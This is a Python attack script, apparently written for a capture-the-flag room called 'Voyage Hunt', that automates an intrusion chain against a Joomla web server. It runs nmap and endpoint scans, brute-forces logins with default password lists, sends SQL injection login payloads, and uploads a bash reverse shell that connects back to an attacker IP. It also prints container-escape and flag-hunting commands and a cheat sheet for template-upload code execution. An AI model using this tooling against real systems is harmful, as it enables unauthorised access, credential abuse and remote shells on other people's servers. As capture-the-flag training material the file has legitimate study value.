#!/usr/bin/env python3
"""
Voyage Hunt - Full Exploitation Flow
Goal: Find User Flag → Root Flag (with Fake Root / Container Escape)

Room Hint: "is it the REAL root or just a ?" 
→ Implies: Fake Root (Docker/Container/Namespace)
→ Strategy: Get shell → User Flag → Detect Container → Escape → Root Flag
"""

import subprocess
import socket
import requests
import sys
from urllib.parse import urljoin
import time
from bs4 import BeautifulSoup
import re
import json

TARGET_IP = "10.82.166.188"
TARGET_HTTP = f"http://{TARGET_IP}"
ATTACKER_IP = "10.2.36.59"  # AttackBox IP
ATTACKER_PORT = 4444

# ==================== PHASE 1: RECON ====================

class Phase1Recon:
    """Initial reconnaissance: nmap, HTTP enumeration"""
    
    @staticmethod
    def run_nmap():
        """Run nmap scan"""
        print(f"\n[*] Running NMAP on {TARGET_IP}...")
        try:
            result = subprocess.run(
                [
                    "nmap", "-sC", "-sV", "-p-", 
                    TARGET_IP
                ],
                capture_output=True, text=True, timeout=300
            )
            print(result.stdout)
            return result.stdout
        except Exception as e:
            print(f"[-] NMAP Error: {e}")
            return None
    
    @staticmethod
    def scan_http():
        """Scan HTTP for endpoints"""
        print(f"\n[*] Scanning HTTP on {TARGET_HTTP}...")
        
        endpoints = [
            "/",
            "/api",
            "/admin",
            "/login",
            "/upload",
            "/files",
            "/index.php",
            "/shell.php"
        ]
        
        for path in endpoints:
            url = urljoin(TARGET_HTTP, path)
            try:
                resp = requests.get(url, timeout=5)
                print(f"[+] {path}: {resp.status_code}")
                if resp.status_code == 200:
                    print(f"    Content-Length: {len(resp.text)}")
                    if len(resp.text) < 500:
                        print(f"    Content: {resp.text[:200]}")
            except Exception as e:
                print(f"[-] {path}: {str(e)[:50]}")
    
    @staticmethod
    def analyze_html():
        """Download and analyze HTML for forms, links, and hidden endpoints"""
        print(f"\n[*] Analyzing HTML content for clues...")
        
        try:
            resp = requests.get(TARGET_HTTP, timeout=5)
            if resp.status_code != 200:
                print(f"[-] Failed to fetch homepage: {resp.status_code}")
                return
            
            print(f"[+] Homepage retrieved ({len(resp.text)} bytes)")
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Find all forms
            print("\n[*] FORMS FOUND:")
            forms = soup.find_all('form')
            if forms:
                for i, form in enumerate(forms):
                    print(f"\n  Form {i+1}:")
                    print(f"    Action: {form.get('action', 'N/A')}")
                    print(f"    Method: {form.get('method', 'GET').upper()}")
                    inputs = form.find_all('input')
                    for inp in inputs:
                        inp_type = inp.get('type', 'text')
                        inp_name = inp.get('name', 'unknown')
                        print(f"      - {inp_type}: {inp_name}")
            else:
                print("  No forms found")
            
            # Find all links
            print("\n[*] LINKS FOUND:")
            links = soup.find_all('a')
            unique_links = set()
            for link in links:
                href = link.get('href', '#')
                text = link.get_text(strip=True)
                if href != '#':
                    unique_links.add(href)
                    print(f"  {href} → {text}")
            
            # Find all scripts
            print("\n[*] SCRIPT TAGS:")
            scripts = soup.find_all('script')
            for i, script in enumerate(scripts):
                src = script.get('src')
                if src:
                    print(f"  Script {i+1}: {src}")
                # Check for inline scripts with endpoints
                if script.string and ('fetch' in script.string or 'ajax' in script.string):
                    print(f"  [!] Inline script with fetch/ajax:")
                    print(f"      {script.string[:200]}")
            
            # Find all buttons
            print("\n[*] BUTTONS:")
            buttons = soup.find_all('button')
            for btn in buttons:
                onclick = btn.get('onclick', '')
                data_action = btn.get('data-action', '')
                text = btn.get_text(strip=True)
                print(f"  {text}")
                if onclick:
                    print(f"    onclick: {onclick}")
                if data_action:
                    print(f"    data-action: {data_action}")
            
            # Extract all data attributes (common in modern web apps)
            print("\n[*] DATA ATTRIBUTES:")
            all_with_data = soup.find_all(attrs={"data-endpoint": True})
            for elem in all_with_data:
                endpoint = elem.get('data-endpoint')
                print(f"  Endpoint: {endpoint}")
            
            # Look for hardcoded endpoints in HTML comments
            print("\n[*] HTML COMMENTS:")
            comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in text)
            for comment in soup.find_all():
                if comment.name is None and comment.string and any(c in str(comment) for c in ['endpoint', 'api', 'upload', 'shell']):
                    print(f"  [!] {comment.string[:100]}")
            
            # Save full HTML for manual review
            with open("homepage_dump.html", "w", encoding='utf-8') as f:
                f.write(resp.text)
            print(f"\n[+] Full HTML saved to homepage_dump.html")
            
        except Exception as e:
            print(f"[-] Error analyzing HTML: {e}")

# ==================== PHASE 2: EXPLOITATION ====================

class Phase2Exploitation:
    """Initial access exploitation - Joomla specific"""
    
    @staticmethod
    def test_joomla_login(username="admin", password="admin"):
        """Test Joomla login with credentials"""
        print(f"\n[*] Testing Joomla login: {username}:{password}")
        
        try:
            # First, get the login form to extract CSRF token
            resp = requests.get(TARGET_HTTP, timeout=5)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Find the hidden CSRF field
            csrf_field = None
            csrf_token = None
            form = soup.find('form')
            if form:
                for hidden in form.find_all('input', {'type': 'hidden'}):
                    name = hidden.get('name')
                    value = hidden.get('value')
                    if name and ('csrf' in name.lower() or len(str(value)) == 32):
                        csrf_field = name
                        csrf_token = value
                        print(f"[+] CSRF Token found: {csrf_field}={csrf_token}")
            
            # Get other hidden fields
            hidden_fields = {}
            if form:
                for hidden in form.find_all('input', {'type': 'hidden'}):
                    name = hidden.get('name')
                    value = hidden.get('value')
                    if name:
                        hidden_fields[name] = value
            
            print(f"[+] Hidden fields: {hidden_fields}")
            
            # Construct login payload
            payload = {
                'username': username,
                'password': password,
                'option': hidden_fields.get('option', 'com_users'),
                'task': hidden_fields.get('task', 'user.login'),
                'return': hidden_fields.get('return', ''),
                'remember': 'true',
            }
            
            # Add CSRF token if found
            if csrf_token and csrf_field:
                payload[csrf_field] = csrf_token
            
            print(f"[+] Sending payload: {payload}")
            
            # Submit login
            resp = requests.post(
                urljoin(TARGET_HTTP, '/index.php'),
                data=payload,
                allow_redirects=True,
                timeout=5
            )
            
            print(f"[+] Response status: {resp.status_code}")
            print(f"[+] Response length: {len(resp.text)}")
            
            # Check if logged in
            if 'logout' in resp.text.lower() or 'dashboard' in resp.text.lower():
                print(f"[+++] SUCCESS! User {username} logged in!")
                return True, resp
            elif 'error' in resp.text.lower():
                print(f"[-] Login failed (error in response)")
                return False, resp
            else:
                print(f"[?] Unclear response - might be logged in")
                return None, resp
                
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False, None
    
    @staticmethod
    def brute_force_joomla(wordlist=None):
        """Brute force Joomla login"""
        print(f"\n[*] Joomla Brute Force...")
        
        if not wordlist:
            # Default passwords for Joomla
            passwords = [
                "admin", "password", "12345678", "joomla", "123456",
                "test", "root", "welcome", "123123", "password123"
            ]
            usernames = ["admin", "administrator", "root", "test"]
        else:
            # Read from file if provided
            with open(wordlist) as f:
                passwords = [line.strip() for line in f]
            usernames = ["admin"]
        
        for user in usernames:
            for pwd in passwords:
                success, resp = Phase2Exploitation.test_joomla_login(user, pwd)
                if success:
                    print(f"\n[+++] FOUND: {user}:{pwd}")
                    return user, pwd
                print(f"  Tried {user}:{pwd}...")
        
        print("[-] Brute force failed")
        return None, None
    
    @staticmethod
    def test_sql_injection():
        """Test SQL injection in Joomla login"""
        print(f"\n[*] Testing SQL Injection in Joomla login...")
        
        sqli_payloads = [
            "admin' OR '1'='1",
            "admin' OR 1=1 #",
            "admin' OR 1=1 --",
            "' OR 'a'='a",
            "admin' /*",
        ]
        
        for payload in sqli_payloads:
            try:
                resp = requests.get(TARGET_HTTP, timeout=5)
                soup = BeautifulSoup(resp.text, 'html.parser')
                form = soup.find('form')
                
                hidden_fields = {}
                if form:
                    for hidden in form.find_all('input', {'type': 'hidden'}):
                        name = hidden.get('name')
                        value = hidden.get('value')
                        if name:
                            hidden_fields[name] = value
                
                login_payload = {
                    'username': payload,
                    'password': 'anything',
                    'option': hidden_fields.get('option', 'com_users'),
                    'task': hidden_fields.get('task', 'user.login'),
                    'remember': 'true',
                }
                
                resp = requests.post(
                    urljoin(TARGET_HTTP, '/index.php'),
                    data=login_payload,
                    timeout=5
                )
                
                if resp.status_code == 200 and 'logout' in resp.text.lower():
                    print(f"[+++] SQL Injection FOUND: {payload}")
                    return True, payload
                    
            except Exception as e:
                pass
        
        print("[-] SQL Injection not found")
        return False, None
    
    @staticmethod
    def test_password_reset():
        """Test password reset vulnerability"""
        print(f"\n[*] Testing Joomla Password Reset...")
        
        reset_url = urljoin(TARGET_HTTP, "/index.php/component/users/reset?Itemid=101")
        
        try:
            resp = requests.get(reset_url, timeout=5)
            print(f"[+] Reset page status: {resp.status_code}")
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            reset_form = soup.find('form')
            
            if reset_form:
                print("[+] Reset form found!")
                inputs = reset_form.find_all('input')
                for inp in inputs:
                    print(f"    {inp.get('name')}: {inp.get('type')}")
            
            # Try to reset admin account
            payload = {
                'email': 'admin@localhost',
            }
            
            resp = requests.post(reset_url, data=payload, timeout=5)
            print(f"[+] Reset attempt response: {resp.status_code}")
            
            if 'success' in resp.text.lower() or 'sent' in resp.text.lower():
                print("[+] Password reset might be vulnerable!")
                
        except Exception as e:
            print(f"[-] Password reset test error: {e}")
    
    @staticmethod
    def upload_shell(shell_script=None):
        """Try to upload reverse shell"""
        print(f"\n[*] Attempting file upload...")
        
        if not shell_script:
            # Bash reverse shell
            shell_script = f"""#!/bin/bash
bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"""
        
        files = {"file": ("shell.sh", shell_script)}
        locations = ["/upload", "/api/upload", "/files/upload"]
        
        for loc in locations:
            try:
                resp = requests.post(
                    urljoin(TARGET_HTTP, loc),
                    files=files,
                    timeout=5
                )
                print(f"[+] {loc}: {resp.status_code}")
                return resp
            except Exception as e:
                pass
        
        print("[-] No upload endpoint found")
    
    @staticmethod
    def test_command_injection():
        """Test for command injection"""
        print(f"\n[*] Testing command injection...")
        
        payloads = [
            {"cmd": "whoami"},
            {"command": "id"},
            {"exec": "whoami"},
        ]
        
        for payload in payloads:
            try:
                resp = requests.post(
                    urljoin(TARGET_HTTP, "/api"),
                    json=payload,
                    timeout=5
                )
                print(f"[+] Payload {payload}: {resp.status_code}")
                print(f"    Response: {resp.text[:200]}")
            except:
                pass
    
    @staticmethod
    def test_default_creds():
        """Test default credentials"""
        print(f"\n[*] Testing default credentials...")
        
        creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("user", "user"),
        ]
        
        for user, pwd in creds:
            try:
                resp = requests.post(
                    urljoin(TARGET_HTTP, "/login"),
                    json={"username": user, "password": pwd},
                    timeout=5
                )
                if resp.status_code == 200:
                    print(f"[+] {user}:{pwd} might work → {resp.status_code}")
            except:
                pass

# ==================== PHASE 3: USER FLAG ====================

class Phase3UserFlag:
    """Extract user-level flag"""
    
    @staticmethod
    def find_flag(shell_output=None):
        """Find user flag via shell or direct access"""
        print(f"\n[*] Searching for USER FLAG...")
        
        # If we have shell, try these commands
        commands = [
            "cat /home/*/user.txt",
            "find /home -name 'user.txt' 2>/dev/null",
            "find /home -name 'flag.txt' 2>/dev/null",
            "ls -la /home",
        ]
        
        print("[+] Commands to run on shell:")
        for cmd in commands:
            print(f"    {cmd}")

# ==================== PHASE 4: PRIVILEGE ESCALATION ====================

class Phase4PrivEsc:
    """Detect fake root and find escape vector"""
    
    @staticmethod
    def check_container():
        """Check if in container/docker"""
        print(f"\n[*] Checking if in CONTAINER...")
        
        checks = [
            ("whoami", "Should be 'root' or user"),
            ("id", "Check for root privileges"),
            ("hostname", "container ID might be visible"),
            ("cat /proc/1/cgroup", "Docker/cgroup hint"),
            ("ls -la /.dockerenv", "Docker marker file"),
            ("ls -la /proc/1/cwd", "See what process 1 is"),
        ]
        
        print("[+] Commands to detect container:")
        for cmd, hint in checks:
            print(f"    {cmd}")
            print(f"       → {hint}")
    
    @staticmethod
    def find_mounts():
        """Find mounted host filesystem"""
        print(f"\n[*] Looking for MOUNTED HOST FS...")
        
        commands = [
            "mount",
            "df -h",
            "ls -la /mnt",
            "ls -la /host",
            "find / -name 'root.txt' 2>/dev/null",
            "find / -name '*.txt' 2>/dev/null | grep -i flag",
        ]
        
        print("[+] Mount detection commands:")
        for cmd in commands:
            print(f"    {cmd}")
    
    @staticmethod
    def escape_container():
        """Potential container escape vectors"""
        print(f"\n[*] CONTAINER ESCAPE VECTORS...")
        
        vectors = {
            "1. Mounted host /": [
                "ls /host",
                "cat /host/root/root.txt"
            ],
            "2. Mounted /mnt": [
                "ls /mnt",
                "cat /mnt/*/root.txt"
            ],
            "3. Capability abuse": [
                "getcap -r / 2>/dev/null",
                "capsh --print"
            ],
            "4. Privileged namespace": [
                "unshare -i -m -n -p -u -U --mount-proc sbin/bash",
            ]
        }
        
        for vector, cmds in vectors.items():
            print(f"\n[+] {vector}")
            for cmd in cmds:
                print(f"    → {cmd}")

# ==================== PHASE 5: ROOT FLAG ====================

class Phase5RootFlag:
    """Extract root-level flag"""
    
    @staticmethod
    def find_root_flag():
        """Find root flag"""
        print(f"\n[*] Searching for ROOT FLAG...")
        
        print("[+] Try these in order:")
        print("    1. cat /root/root.txt")
        print("    2. cat /host/root/root.txt")
        print("    3. find / -name 'root.txt' 2>/dev/null")
        print("    4. cat /proc/sys/kernel/osrelease  (check if fake)")

# ==================== MAIN FLOW ====================

def main():
    """Run full exploitation flow"""
    print("\n" + "="*60)
    print("VOYAGE HUNT - Full Exploitation (Joomla Target)")
    print("="*60)
    
    choice = input("\n[?] What do you want to run?\n"
                   "1. Full Recon (nmap + HTTP + HTML Analysis)\n"
                   "2. Joomla Login Brute Force\n"
                   "3. Joomla SQL Injection Test\n"
                   "4. Joomla Password Reset Exploit\n"
                   "5. Test Single Credentials\n"
                   "6. Container Detection\n"
                   "7. All Steps\n"
                   "\nChoice (1-7): ").strip()
    
    if choice in ["1", "7"]:
        Phase1Recon.run_nmap()
        Phase1Recon.scan_http()
        Phase1Recon.analyze_html()
    
    if choice == "2" or choice == "7":
        Phase2Exploitation.brute_force_joomla()
    
    if choice == "3" or choice == "7":
        Phase2Exploitation.test_sql_injection()
    
    if choice == "4" or choice == "7":
        Phase2Exploitation.test_password_reset()
    
    if choice == "5":
        user = input("Username (default: admin): ").strip() or "admin"
        pwd = input("Password (default: admin): ").strip() or "admin"
        success, resp = Phase2Exploitation.test_joomla_login(user, pwd)
        if success:
            print(f"\n[+++] LOGIN SUCCESS!")
            print(f"Response saved. You may be able to access admin panel now.")
    
    if choice in ["6", "7"]:
        Phase4PrivEsc.check_container()
        Phase4PrivEsc.find_mounts()
        Phase4PrivEsc.escape_container()
        Phase5RootFlag.find_root_flag()
    
    # Show quick reference
    print("\n" + "="*60)
    print("JOOMLA EXPLOITATION REFERENCE")
    print("="*60)
    print("""
[JOOMLA PATHS]
    /administrator/         → Admin panel
    /index.php/component/users/login   → Direct login
    /index.php/component/users/reset   → Password reset
    /logs/                 → Log directory (sometimes readable)

[COMMON JOOMLA USERNAMES]
    admin (most common)
    administrator
    root

[COMMON JOOMLA PASSWORDS]
    admin, password, joomla, 12345678, test

[SQL INJECTION ATTEMPT]
    Username: admin' OR '1'='1
    Password: anything

[IF LOGGED IN]
    Check /administrator/
    Look for template upload (RCE)
    Check /administrator/index.php?option=com_templates
    Look for extensions/modules

[REVERSE SHELL ON JOOMLA]
    Create PHP reverse shell
    Upload via template manager
    Execute
    """)

if __name__ == "__main__":
    main()

if __name__ == "__main__":
    main()
